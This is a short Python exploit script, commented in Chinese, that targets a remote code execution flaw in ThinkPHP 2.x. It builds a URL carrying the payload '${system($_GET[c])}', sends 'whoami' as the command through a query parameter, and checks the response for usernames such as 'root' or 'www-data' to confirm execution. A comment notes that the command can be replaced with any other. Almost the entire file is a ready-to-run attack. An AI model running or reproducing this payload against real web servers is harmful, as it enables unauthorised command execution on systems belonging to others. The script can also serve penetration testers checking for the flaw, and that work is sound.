import requests
import sys

# 从命令行获取目标URL
if len(sys.argv) < 2:
    print("用法: python thinkphp_2x_rce.py <目标URL>")
    sys.exit(1)

target_url = sys.argv[1]

# 基础payload（使用$_GET[c] 传递命令）
payload = "/index.php?s=/index/index/name/${system($_GET[c])}"

if target_url.endswith('/'):
    target_url = target_url[:-1]

# 构造完整的URL
exploit_url = target_url + payload

print(f"[*] 尝试访问: {exploit_url}")

# 添加命令参数
command = "whoami"  # 可以更改为其他命令
params = {
    'c': command
    }

# 发送请求
try:
    response = requests.get(exploit_url, params=params, timeout=10)  # 建议添加 timeout
    print(f"[*] 实际请求的完整URL: {response.url}")  # 这行代码会输出最终拼接好的URL
    print("[*] 响应状态码: {}".format(response.status_code))
    # print("[*] 响应内容:\n{}".format(response.text))
except requests.exceptions.ConnectionError:
    print("[!] 无法连接到目标，请检查URL是否正确或目标是否运行。")
    sys.exit(1)
except requests.exceptions.Timeout:
    print("[!] 请求超时，目标可能响应缓慢或无法访问。")
    sys.exit(1)
except Exception as e:
    print(f"[!] 发生未知错误: {e}")
    sys.exit(1)

# 分析响应
if "root" in response.text or "www-data" in response.text or "apache" in response.text:
    print(f"[+] 可能存在远程代码执行漏洞！")
else:
    print("[-] 未检测到明显的远程代码执行迹象。或者重新检查payload")